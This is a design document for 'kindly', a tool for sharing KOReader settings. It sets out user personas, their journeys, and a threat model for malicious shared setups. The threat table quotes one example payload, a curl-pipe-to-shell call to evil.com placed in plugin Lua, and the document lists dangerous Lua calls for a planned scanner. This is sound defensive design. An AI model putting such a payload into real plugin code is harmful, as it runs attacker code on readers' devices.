# 81 — Personas, journeys, and the threat model we're not solving yet
### *Walking real humans through v1.0, including the adversarial one*

Companion to `80-v0.6-plus-roadmap.md`. The lens pass produces a plan
shaped by frameworks. This pass produces a plan shaped by users —
specifically by the *range* of users kindly has to cover, from a
paranoid OpenBSD-on-laptop nix-flake devotee to a 68-year-old who
finally learned to plug in their Kindle.

Date: 2026-04-22.
Status: analysis + proposed amendments to the roadmap.

---

## 1. The spectrum

Seven personas. First six are users we serve; the seventh is the
adversary we design against.

| # | Persona | Comfort w/ CLI | Comfort w/ risk | Primary interaction |
|---|---------|----------------|------------------|---------------------|
| U1 | **Paranoid power-user** (Nix/OpenBSD/`git verify-commit`) | Expert | Very low — audits everything | CLI, reads source |
| U2 | **Jailbreaker** (scripts their life, lives in terminal) | Expert | Medium — will try things, expects rollback | CLI, JSON pipelines |
| U3 | **Productivity reader-nerd** (2-3 Kindles over the years) | Intermediate | Low — just wants the config back | CLI for regular ops, GUI welcome |
| U4 | **Curious new KOReader user** (found YouTube tutorial) | Novice | Very low — terrified of bricking | GUI only |
| U5 | **Post-factory-reset panicked** ("dark mode disappeared") | None | Zero | GUI, single "Undo" button |
| U6 | **The sharer** (wrote a nice config, wants others to use it) | Intermediate-expert | N/A (producer, not consumer) | CLI + eventual GUI export flow |
| U7 | **Adversarial sharer** (distributes a malicious Setup) | Expert | — | Attack surface |

---

## 2. Journeys through v1.0

Each persona walks the same product. Different things break for each.

### 2.1 U1 — Paranoid power-user

> *"Show me every byte that would be written before it's written. No
> auto-fetch. Signed manifests or it doesn't import."*

**Install.** Downloads binary. First thing: verifies the GPG/minisign
signature of the release artifact. Wants SLSA attestation / reproducible
build. If kindly's release pipeline doesn't produce these — audit stops
at the tool itself, never gets to the product.

**Pull.** Fine. Local. Reads the source anyway.

**Apply.** Fine. Local. Reads the diff. Uses `--dry-run` always.

**Try a stranger's `.kset` from Reddit.**

1. `kindly setup inspect alice-night-reading.kset --verbose --json`
2. Expects to see: every setting change, every plugin file hash with
   a known-good comparison, author signature status, every path that
   would be touched, every bit of Lua code in the fat archive.
3. If the manifest has `meta.author: alice@example.com` — they want
   to verify alice's signature. If no signature, treats it as unsigned.
4. If any plugin file hash differs from the catalog's known hash for
   that KOReader version → **hard block**, not warn.
5. If any Lua code in fat archive contains `os.execute`, `io.popen`,
   `require("socket")`, `loadstring`, `load(`, or `dofile` with a
   variable path → **flag for manual review**.
6. They import into a test Kindle (they have one, they're U1), diff
   the live state, compare against manifest. Then, and only then,
   might they apply to their main device.

**What breaks in the current plan:**

- v0.11 W32 warns on hash mismatch; U1 needs a `--strict-hashes` flag
  that blocks.
- No lua-code-scan story at all. Flagging `os.execute` in imported
  plugin files isn't on the roadmap.
- `meta.author` is an unsigned string. U1 wants real signatures with
  a TOFU store.
- No remote-fetch story with hash pinning. Even locally stored
  `.kset` they got from Reddit, they want to verify its hash against
  a published one.
- No reproducible-build attestation for kindly itself.

### 2.2 U2 — Jailbreaker

> *"Pipe it into jq. Rollback-loop on any failure. Exit codes that
> mean something."*

**Install.** `brew install kindly`.

**Daily loop.** `kindly pull --json | jq '.settings.night_mode'`. Sources
scripts from `.kindly/history.jsonl`. Runs `kindly apply` with a flag
to accept warnings, fails hard on errors. Writes a git hook that
`kindly diff --json` before every commit of their dotfiles repo.

**Try a stranger's .kset.** Forks it, edits, applies.

**What breaks in the current plan:**

- Not much — they're the primary target of v0.6 (JSON mode) and v0.10
  (`kindly serve`).
- Minor: they want structured exit codes (not just 0/1/2). E.g. exit
  3 = warnings only, exit 4 = hash mismatch, exit 5 = parse error.
  Current plan returns 1 or 2.

### 2.3 U3 — Productivity reader-nerd

> *"I just reflashed a Kindle. Get my setup back in under a minute."*

**Install.** Downloads from GitHub release.

**Day 1.** `kindly pull` on old device. Emails themselves the yaml.

**Day 30.** `kindly apply my-config.yaml` on new device. Done.

**Occasional.** Tries a template, e.g. `night-reading`. Looks at the
preview. Decides.

**What breaks in the current plan:**

- Nothing fatal. They benefit from v0.7 preview, v0.8 history ("what
  did I change 3 weeks ago?"), v0.9 plugin catalog ("what's
  `zsync`?").
- GUI (v1.0) is nice but not required.

### 2.4 U4 — Curious new KOReader user

> *"I want to try this 'minimal reader' thing but I'm scared. If
> anything breaks, can I undo?"*

**Install.** Downloads .dmg / .exe / .AppImage. Double-click. Done.
If there's any terminal step, U4 gives up.

**Day 1.** Opens kindly. App says "plug in your Kindle." Plugs in.
Detected — shows device name + KOReader version.

**Templates screen.** Sees "Night reading" with a screenshot of the
resulting device + description. Clicks "Preview" — sees grouped diff:
"Fonts: 2 changes / Colors: Night mode ON / Status bar: Progress bar
style changed / Plugins: 3 disabled." Each with a tooltip explaining
what it is.

**Applies.** Toast: "Backed up. To undo: click Undo in the top bar."

**Something feels wrong.** Clicks Undo. Restored.

**What breaks in the current plan:**

- GUI is v1.0. Until then U4 can't use the product at all. That's a
  plan choice, not a bug, but **we should call it out explicitly**:
  U4 has no path to kindly until v1.0. If we ever need a non-technical
  early tester, we can't offer them anything.
- "Undo" must be a visible primitive, not a rollback command with a
  stamp arg. Roadmap has `rollback --to N` (v0.8) but no `undo` alias
  for "last mutation." Rename/add: `kindly undo`.
- Template preview needs visual material (screenshots of the resulting
  device). UX4 in the roadmap acknowledges this. Making it real means
  investing in the screenshot asset library now, not at v1.0.
- Plugin descriptions in the catalog need to be **human-language**,
  not terse engineer-shorthand. "Automatically warms the screen at
  sunset" beats "autowarmth: auto screen warmth per time of day."

### 2.5 U5 — Post-factory-reset panicked

> *"I pressed the wrong button. My night mode is gone. Please."*

**Install.** A friend sends them the .dmg link.

**Day 1.** Opens kindly. Plugs in Kindle. App says:

- If they'd previously used kindly: "You have a backup from 3 days
  ago. Restore? (1 button.)"
- If not: "I can't help without a prior backup. Start by pulling your
  current config so this doesn't happen again."

**What breaks in the current plan:**

- Empty-state UX (no prior snapshots) needs clear language. Not in
  current plan.
- The "restore my last known good" is `rollback --to <latest>` — needs
  to be a single obvious button in GUI. Same fix as U4.
- Cross-device handoff: U5 got the binary from a friend. If the friend's
  kindly install has their snapshots, none of that helps U5. Document:
  snapshots are local; share `.kset` exports, not `.kindly/` dirs.

### 2.6 U6 — The sharer

> *"I put together a great reading config. How do I let others use it
> without them getting burned if I made a mistake?"*

**Author flow.** `kindly setup export my-config --include-plugin-files`.
Gets a `.kset`.

**Wants:**

- To preview it the way an importer would see it. "How does my own
  export look?" → plays to v0.7 preview.
- To sign it. Even a detached minisign file. So recipients can verify
  "this is really from me."
- To publish somewhere. No hub in our plan — fine, they upload to
  their own site / GitHub release / Reddit attachment.
- To version it. `my-config@v1`, `my-config@v2`. Currently each export
  is an independent manifest with an identity hash; no version chain.

**What breaks in the current plan:**

- Signing is in v0.11 W33 but only as unverified string. Upgrade to
  actual signatures (minisign).
- No versioning/chain concept for a given "named" setup. Meta can
  include `version`, but there's no way to prove `my-config@v2` is
  the successor of `my-config@v1` (same author).
- Preview-as-importer-sees-it isn't an explicit command. Add:
  `kindly setup preview <file> --as-device default` — shows what a
  fresh device would see.

### 2.7 U7 — The adversary (threat model)

Not a user we serve. A user we design *against*. Their attacks, and
what stops each:

| Attack | Today | After current plan (v0.11) | Gap |
|--------|-------|---------------------------|-----|
| Setup sets `ssh_allow_external=true` silently | Nothing explicit (schema knows the key is boolean, allows it) | v0.11 W31 suspicious-key list warns | **Gap:** warning, not block. U1 wants block mode. |
| Fat Setup contains tampered `SSH.koplugin/main.lua` | Secrets are filtered on EXPORT, but no IMPORT hash check | v0.11 W32 hashes against catalog; warns | **Gap:** only catalogued plugins are checked. Non-catalogued plugin = no signal. |
| Setup contains `os.execute("curl evil.com | sh")` in plugin Lua | No scan | Not in plan | **Not covered.** Need static scan of Lua code for dangerous calls. |
| Setup modifies `patches/*.lua` with malicious runtime monkey-patches | No scan | Not in plan | **Not covered.** Patches execute in KOReader context, full access. |
| Setup author lies about what the manifest does | `setup inspect` shows truth | v0.7 rich preview groups by category | ✓ Covered — preview always shows actual changes. |
| Setup ships leaked secrets (author's own zlibrary password) | Secret denylist filters on export ✓ | — | ✓ Covered for known-secret keys. Unknown keys holding secrets still escape. |
| Typo attack — visually-similar key name | v0.5 schema flags unknown | — | ✓ Covered. |
| Malicious template bundled with kindly itself | Templates are baked into binary; we control | — | ✓ Covered by our release process. |
| Hijack kindly's update channel | No update channel | — | ✓ We don't auto-update. Manual binary download + verify is on the user. |
| Supply-chain against kindly's deps (npm/bun libs) | — | — | **Gap:** standard modern supply-chain risk. `bun install` needs lockfile + audit story. |

**Five real gaps** the current plan doesn't close:

1. No **hard-block mode** for suspicious keys / hash mismatches — U1 needs it.
2. No **Lua static analyzer** for imported plugin and patch files.
3. No **patches/*.lua** scanning at all.
4. No **real signatures** on manifests.
5. No **supply-chain hygiene** story for kindly itself.

---

## 3. The decentralized distribution question

Claudiu: *"We're not designing a flakes honour system yet as
distribution is decentralized anyway, but let's not proceed without
thinking about that."*

### What Nix flakes do

- Every input (dependency, repo, archive) has a pinned hash in
  `flake.lock`.
- On fetch, the hash is verified. On mismatch, fail loud.
- No central registry trust; you trust the lock you committed. If
  upstream gets compromised, your build doesn't care — the lock pins
  the old good hash.
- Signing is separate (and usually layered on via tooling like
  `nix-signed` or OSS attestation).

### What "decentralized distribution" means for kindly

A Setup reaches a user by:
- Email attachment
- Reddit post linking to a gist
- Direct URL (HTTPS) the author controls
- Shared file on a messaging app
- USB stick at a book club meetup (yes, really)

No hub. No registry. Each `.kset` travels as a standalone artifact.

### What we should NOT build now

- A central kindly registry (defer to v2+; community may never want it).
- Trust-on-first-use author keychain auto-fetched from a directory
  service (no directory service to trust).
- Automatic re-fetch / update notifications for Setups.

### What we should DESIGN so we don't close doors

Four things, none of which are builds now but all of which shape the
data format:

**D1. Hash-pinned URL scheme.** A Setup referenced by URL can include a
pinned hash:

```
kset://sha256:abc123...@https://alice.com/my-config.kset.yaml
```

Fetching: download, compute hash, compare to pinned. Mismatch → refuse.
Pure client-side; no registry. Easy to add later. The data format just
needs to NOT close this door.

**D2. Manifest meta fields we reserve now, populate later.**

```yaml
meta:
  name: my-config
  version: 2          # ← reserved, author-managed
  author: alice       # ← reserved, human identifier
  author_key_id: ...  # ← reserved, for minisign / age key id
  supersedes: ...     # ← reserved, previous manifest hash
  created_at: 2026-04-22T...
```

Reserving the fields in the schema now means imports tomorrow can
start using them without a schema migration. Implementing the
signatures and supersedes-chain can come later.

**D3. Detached signature sibling file.** Alongside `my-config.kset`,
a `my-config.kset.minisig`. kindly checks it if present; ignores if
absent (but surfaces the absence prominently in preview for U1).

Detached sig is the decentralized standard (minisign, signify, age,
ssh-sig). No infrastructure needed.

**D4. TOFU author store.** `.kindly/authors.json` records author keys
you've accepted. First import from `alice@example.com` asks the user
to accept the key. Future imports verify against stored key or warn.

Like SSH `known_hosts`. Local-only. No directory.

### What we explicitly defer

- Central registry. Probably never.
- Auto-update of Setups. No.
- Web-of-trust / keyring import. Maybe v2.
- Reputation systems. No.

---

## 4. Proposed amendments to the roadmap (80-)

### Amendment A — expand v0.11 from 1 week to 2-3 weeks

Current v0.11 is a security baseline in name only (suspicious keys +
hash check). The persona analysis shows five real gaps (§2.7). Expand:

**v0.11 — Security foundation (2-3 weeks)**

Add to W31-W34:

| W# | Work item | DoD |
|----|-----------|-----|
| W35 | `--strict-imports` flag — blocks on any hash mismatch, suspicious key, or unknown plugin. Not warn. U1's default. | Integration test: import with mismatched hash + `--strict-imports` → exit non-zero, no writes. |
| W36 | Lua static scanner — flags `os.execute`, `io.popen`, `require("socket")`, `loadstring`, `load(`, `dofile(<non-literal>)` in imported plugin & patch Lua files. Reports line numbers. | Test: fat Setup with flagged code → preview surfaces per-file warnings; `--strict-imports` blocks. |
| W37 | Patch file scanning — `patches/*.lua` parsed like plugin code. | Same as W36 for the patches path. |
| W38 | Reserved manifest meta fields — `meta.version`, `meta.author`, `meta.author_key_id`, `meta.supersedes`. Schema accepts; no verification yet. | Schema migration. Existing Setups unaffected. |
| W39 | Detached minisign verification — if `<file>.kset.minisig` present, verify; surface result in preview. No key management yet (user provides public key via `--verify-key <path>`). | Integration test: signed + unsigned Setup both importable, signature status reflected. |

### Amendment B — add "distribution future-proofing" to v0.11 scope

| W# | Work item | DoD |
|----|-----------|-----|
| W40 | `kindly setup fetch <url>` — HTTPS fetch with hash pinning. URL may embed `sha256=` hash; if absent, display hash and ask user to confirm. Never auto-apply after fetch. | Integration test (recorded fixtures): fetch with matching hash succeeds; mismatched hash refuses. |
| W41 | Hash-pinned URL parser — `kset://sha256:...@https://...` recognized, fetch verifies. | Parser tests. |

### Amendment C — `kindly undo` primitive at v0.8

Persona U4/U5 expect "undo" as a visible verb. Current plan has `rollback
--to N`; add a shortcut:

| W# | Work item | DoD |
|----|-----------|-----|
| W42 | `kindly undo` — alias for `rollback --to <last-mutation>`. Text output: "Undone: <cmd> from <ts>. To undo the undo: `kindly redo`." | Covered by W16 rollback tests. `undo` + `redo` (undo the undo) round-trip tested. |

### Amendment D — per-phase persona acceptance criteria

Each phase in 80- gets a new "Persona impact" row:

- **v0.6**: primary U2 (JSON consumer); secondary U1 (audit via JSON);
  neutral U3-U6.
- **v0.7**: primary U2, U3 (rich preview CLI); secondary U4-U5 (preview
  data ready for GUI); neutral U1 (they read raw).
- **v0.8**: primary U3 (history as git-log); secondary U2 (script the
  log); sets up "Undo" primitive for U4-U5 at v1.0.
- **v0.9**: primary U3 (explore plugin catalog); secondary U1 (audit
  catalog); enables Ninite-flow for U4 at v1.0.
- **v0.10**: infrastructure for U4-U5 (GUI needs `serve`); neutral for
  others.
- **v0.11** (expanded): primary U1 (signature + static scan); secondary
  U6 (sign their exports); sets up refuse-apply flows for U4 at v1.0.
- **v1.0**: primary U4, U5 (first time product is usable for them);
  also U3 gets a UI for tasks they currently do on CLI.

### Amendment E — collect visual asset library *during* v0.7, not waiting for v1.0

The v0.7 preview needs screenshots / mockups of KOReader surfaces to
be useful to U4/U5. Start collecting at v0.7 kickoff:

- Screenshots of Claudiu's own device per surface (status bar
  variants, menu layouts, progress bar styles, night mode on/off,
  font size tiers).
- Documented: `docs/mockups/<surface>-<variant>.png` with what
  settings produce each.
- Baseline for both the taxonomy descriptions (v0.7) AND the GUI
  template previews (v1.0).

### Amendment F — supply-chain hygiene for kindly itself

| W# | Work item | DoD |
|----|-----------|-----|
| W43 | Reproducible build audit — can `bun build --compile` produce bit-reproducible binaries on macOS/Linux? Document. | Doc: `docs/87-build-reproducibility.md` with findings. If not reproducible, note blockers. |
| W44 | Dependency policy — lockfile committed (done?), `bun audit` in CI, pinned versions. | CI workflow file. |
| W45 | Release artifact signing — minisign releases on GitHub. Public key in README + also in binary. | Document key rotation policy. |

These go into v0.11 or a parallel v0.11.1. Not blocking v0.6-v0.10.

---

## 5. What this analysis changed

- **v0.11 scope expanded** — 1 week → 2-3 weeks. Security is not an
  afterthought; two personas require it (U1 hard, U6 soft).
- **`kindly undo` added** at v0.8 — personas U4/U5 need the verb.
- **Manifest meta fields reserved** at v0.11 — preserves the option
  to layer signing / versioning / supersedes-chain later without
  schema migration.
- **Distribution-future-proofing** (hash-pinned URLs, detached sigs,
  TOFU author store) designed, only minimally implemented. Doors
  stay open.
- **Visual asset collection** moved from v1.0 prep into v0.7 kickoff.
- **Supply-chain hygiene** split into a parallel mini-phase v0.11.1.
- **Persona acceptance criteria** added per phase as a tracking field.

Five new work items (W35-W45), net +1-2 weeks on v0.11.

---

## 6. Open questions for Claudiu

| Q# | Question | Recommendation |
|----|----------|----------------|
| PQ1 | Accept the v0.11 expansion (1w → 2-3w)? | Yes — U1 + U7 surface gaps that 1 week can't close. |
| PQ2 | Do we build W40/W41 (remote fetch) or reject? "Decentralized via file sharing" is fine without HTTPS fetch. | Build, but default-off. Opt-in flag: `kindly setup import <url> --fetch`. Keeps the path open; costs ~2 days. |
| PQ3 | Minisign vs age vs GPG for W39 signing? | Minisign. Smallest, simplest, key files are one line, rust/go/c implementations exist, no web of trust baggage. |
| PQ4 | `kindly undo` as built-in vs shell alias? | Built-in. U4/U5 never touch a shell. |
| PQ5 | Is supply-chain hygiene (Amendment F) a v0.11.1 parallel track or blocking for v1.0? | Parallel. Nothing in F changes how the product works for users; it changes how we ship it. |
| PQ6 | Do we ever design for U4/U5 on CLI, or is their only path the GUI (v1.0)? | GUI only. Trying to make CLI novice-friendly conflicts with U1/U2 needs. Accept the split. |

---

## 7. What we're NOT building (reinforced)

Per planner-brain anti-patterns: explicit anti-feature list, reinforced
from the persona walkthrough.

| Ask | Verdict | Why |
|-----|---------|-----|
| Central kindly registry | Never (v∞) | Audience is decentralized-first. |
| Auto-update of Setups | Never | Footgun. Every re-fetch is a manual decision. |
| Web-of-trust import | Defer to v2+ | No existing key directory to stand on. |
| GPG-based signatures | Defer / refuse | GPG UX is a known failure mode; minisign covers the need. |
| "Trusted" tag from kindly the project | Never | We have no authority to certify strangers' Setups. |
| Reputation / ratings | Never | Out of scope; reinforces central-hub mindset we rejected. |
| Cloud-based encryption for Setups | Never | If you need secrets in a Setup, it's the wrong tool. Use SOPS + git locally. |
| Auto-update of kindly itself | Never | User downloads binary, verifies sig, installs. Manual. |
